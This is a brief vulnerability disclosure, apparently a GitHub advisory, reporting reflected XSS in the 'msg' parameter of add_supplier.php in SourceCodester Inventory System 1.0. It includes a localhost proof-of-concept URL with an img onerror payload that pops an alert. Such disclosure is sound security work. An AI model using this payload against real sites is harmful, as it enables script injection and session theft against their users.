# Reflected XSS in Inventory System (Add Supplier)
...
* **Version**: 1.0
* **Component**: Add Supplier (`add_supplier.php`)
* **Vulnerable Parameter**: `msg` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `add_supplier.php` file.
...
```
http://127.0.0.1:8089/add_supplier.php?msg=%3Cimg%20src=%22x%22%20onerror=%22alert(808774)%22%3E
...
<img width="915" height="639" alt="图片" src="https://github.com/user-attachments/assets/192f3f7d-8151-4f4d-9b9a-a4491c04f4de" />
